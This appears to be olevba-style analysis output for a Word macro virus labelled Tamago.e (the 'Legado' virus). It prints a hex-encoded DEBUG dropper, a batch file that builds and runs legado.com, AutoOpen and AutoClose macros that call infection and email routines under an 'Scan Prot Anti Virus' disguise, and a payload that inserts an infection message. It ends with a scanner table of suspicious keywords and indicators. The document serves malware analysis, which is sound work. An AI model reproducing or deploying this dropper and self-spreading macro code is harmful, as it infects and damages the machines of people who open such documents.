+Print #1, "E 1D80 7E 0A 06 57 FF 76 08 0E E8 78 FE 8B E5 5D CA 0C"
+Print #1, "E 1D90 00 55 8B EC 81 EC 00 02 83 7E 06 00 7E 5C 83 7E"
+Print #1, "E 1DA0 08 00 7E 56 81 7E 08 FF 00 7F 4F 81 7E 06 FF 00"
+Print #1, "E 1DB0 7E 05 C7 46 06 FF 00 8D BE 00 FF 16 57 C4 7E 0A"
+Print #1, "E 1DC0 06 57 B8 01 00 50 8B 46 08 48 50 0E E8 58 FE 8D"
+Print #1, "E 1DD0 BE 00 FE 16 57 C4 7E 0A 06 57 8B 46 08 03 46 06"
+Print #1, "E 1DE0 50 B8 FF 00 50 0E E8 3E FE 0E E8 7B FE C4 7E 0A"
+Print #1, "E 1DF0 06 57 B8 FF 00 50 0E E8 09 FE 8B E5 5D CA 08 00"
+Print #1, "E 1E00 8B DC 1E 36 C5 7F 04 33 C9 89 0D B8 00 3D 81 7D"
+Print #1, "E 1E10 02 B1 D7 74 0D B0 02 FF 05 81 7D 02 B3 D7 74 02"
+Print #1, "E 1E20 B4 3C 80 7D 30 00 74 09 8D 55 30 CD 21 72 5A 89"
+Print #1, "E 1E30 05 B8 B0 03 BA 21 01 33 C9 33 DB 81 7D 02 B1 D7"
+Print #1, "E 1E40 74 2F 8B 1D B8 00 44 CD 21 F6 C2 80 B8 05 04 BA"
+Print #1, "E 1E50 21 01 8B C8 8B DA 75 14 81 7D 02 B3 D7 75 03 E8"
+Print #1, "E 1E60 2B 00 B8 E0 03 BA 21 01 33 C9 33 DB C7 45 02 B2"
+Print #1, "E 1E70 D7 89 45 14 89 55 16 89 4D 18 89 5D 1A C7 45 1C"
+Print #1, "E 1E80 25 04 C7 45 1E 21 01 33 C0 1F CA 04 00 33 D2 33"
+Print #1, "E 1E90 C9 8B 1D B8 02 42 CD 21 2D 80 00 83 DA 00 73 04"
+Print #1, "E 1EA0 33 C0 33 D2 8B CA 8B D0 8B 1D B8 00 42 CD 21 8D"
+Print #1, "E 1EB0 95 80 00 B9 80 00 8B 1D B4 3F CD 21 73 02 33 C0"
+Print #1, "E 1EC0 33 DB 3B D8 74 20 80 B9 80 00 1A 74 03 43 EB F2"
+Print #1, "E 1ED0 8B D3 2B D0 B9 FF FF 8B 1D B8 02 42 CD 21 33 C9"
+Print #1, "E 1EE0 8B 1D B4 40 CD 21 C3 BF 56 00 1E 07 B9 5A 09 2B"
+Print #1, "E 1EF0 CF D1 E9 33 C0 FC F3 AB C3 00 00 00 00 00 00 00"
+Print #1, "E 1F00 00 00 05 4D 5A 60 00 10 00 00 00 00 00 00 00 00"
+Print #1, "E 1F10 00 00 00 00 00 00 00 00 00 00 FF FF 00 00 00 00"
+Print #1, "E 1F20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
+Print #1, "E 1F30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
+Print #1, "E 1F40 00 00 00 00 00 00 00 00 00 10 40 00 00 A0 00 B0"
+Print #1, "E 1F50 00 B8 00 00 02 00 00 00 00 00 00 00 00 00 00 00"
+Print #1, "rcx"
+Print #1, "1E60"
+Print #1, "W"
+Print #1, "q"
+Close 1
+
+
+
+WordBasic.ChDir "C:\"
+Open "C:\EXEC_LG.BAT" For Output As 1
+Print #1, "@echo off"
+Print #1, "debug < c:\legado.scr > nul"
+Rem Print #1, "echo Debug fim"
+Print #1, "c:\dos\legado.com"
+Print #1, "del c:\legado.scr "
+
+Close 1
+WordBasic.Shell "EXEC_LG.BAT", 0
+
+NoDropper:
+
+End Sub
+-------------------------------------------------------------------------------
+VBA MACRO AutoClose.bas 
+in file: Virus.MSWord.Tamago.e - OLE stream: 'Macros/VBA/AutoClose'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+
+Public Sub MAIN()
+Attribute MAIN.VB_Description = "Scan Prot Anti Virus"
+Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoClose.MAIN"
+WordBasic.Call "Infec"
+WordBasic.Call "email"
+
+WordBasic.Call "libvirus"
+End Sub
+-------------------------------------------------------------------------------
+VBA MACRO AutoOpen.bas 
+in file: Virus.MSWord.Tamago.e - OLE stream: 'Macros/VBA/AutoOpen'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+
+Public Sub MAIN()
+Attribute MAIN.VB_Description = "Scan Prot Anti Virus"
+Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
+WordBasic.Call "Infec"
+WordBasic.Call "Email"
+WordBasic.Call "libvirus"
+
+
+End Sub
+-------------------------------------------------------------------------------
+VBA MACRO impreArq.bas 
+in file: Virus.MSWord.Tamago.e - OLE stream: 'Macros/VBA/impreArq'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+
+Public Sub MAIN()
+Attribute MAIN.VB_Description = "Scan Prot Anti Virus"
+Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.impreArq.MAIN"
+If WordBasic.Second(WordBasic.Now()) > 55 Then  'seconds > 55 ?
+    WordBasic.EndOfDocument       'go to the end of document.
+    WordBasic.Insert Chr(11)
+    WordBasic.Insert "Parabéns:"
+    WordBasic.Insert Chr(11)
+    WordBasic.Insert "VOCÊ FOI INFECTADO PELO VIRUS LEGADO!"
+    WordBasic.StartOfDocument     'go to the start of document.
+End If
+End Sub
++----------+--------------------+---------------------------------------------+
+|Type      |Keyword             |Description                                  |
++----------+--------------------+---------------------------------------------+
+|AutoExec  |AutoExec            |Runs when the Word document is opened        |
+|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
+|AutoExec  |AutoClose           |Runs when the Word document is closed        |
+|Suspicious|Environ             |May read system environment variables        |
+|Suspicious|Open                |May open a file                              |
+|Suspicious|Output              |May write to a file (if combined with Open)  |
+|Suspicious|Print #             |May write to a file (if combined with Open)  |
+|Suspicious|CopyFile            |May copy a file                              |
+|Suspicious|Kill                |May delete a file                            |
+|Suspicious|Shell               |May run an executable file or a system       |
+|          |                    |command                                      |
+|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
+|Suspicious|Windows             |May enumerate application windows (if        |
+|          |                    |combined with Shell.Application object)      |
+|Suspicious|SendKeys            |May control another application by simulating|
+|          |                    |user keystrokes                              |
+|Suspicious|AppActivate         |May control another application by simulating|
+|          |                    |user keystrokes                              |
+|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
+|          |                    |(use option --deobf to deobfuscate)          |
+|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
+|          |                    |used to obfuscate strings (option --decode to|
+|          |                    |see all)                                     |
+|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
+|          |                    |used to obfuscate strings (option --decode to|
+|          |                    |see all)                                     |
+|IOC       |eudora.exe          |Executable file name                         |
+|IOC       |legado.SCR          |Executable file name                         |
+|IOC       |EXEC_LG.BAT         |Executable file name                         |
+|IOC       |legado.scr          |Executable file name                         |
++----------+--------------------+---------------------------------------------+
+
